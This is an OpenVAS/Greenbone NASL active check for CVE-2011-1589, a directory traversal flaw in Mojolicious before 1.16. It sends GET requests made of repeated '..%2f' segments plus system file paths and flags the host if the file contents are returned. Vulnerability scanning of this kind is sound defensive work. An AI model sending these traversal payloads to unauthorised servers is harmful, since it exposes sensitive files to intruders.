# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801882");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-05-18 15:37:30 +0200 (Wed, 18 May 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2011-1589");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Mojolicious < 1.16 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_mandatory_keys("Mojolicious/banner");
  script_require_ports("Services/www", 3000);

  script_tag(name:"summary", value:"Mojolicious is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an error in 'Path.pm', which allows remote
  attackers to read arbitrary files via a %2f..%2f (encoded slash dot dot slash) in a URI.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain sensitive
  information that could aid in further attacks.");

  script_tag(name:"affected", value:"Mojolicious prior to version 1.16.");

  script_tag(name:"solution", value:"Update to version 1.16 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/44051");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47402");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/66830");
  script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=697229");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default:3000);

banner = http_get_remote_headers(port:port);

if (banner =~ "Server\s*:\s*Mojolicious") {
  files = traversal_files();

  foreach file (keys(files)) {
    url = crap(data:"..%2f", length:5*10) + files[file];

    if (http_vuln_check(port:port, url:url, pattern:file)) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
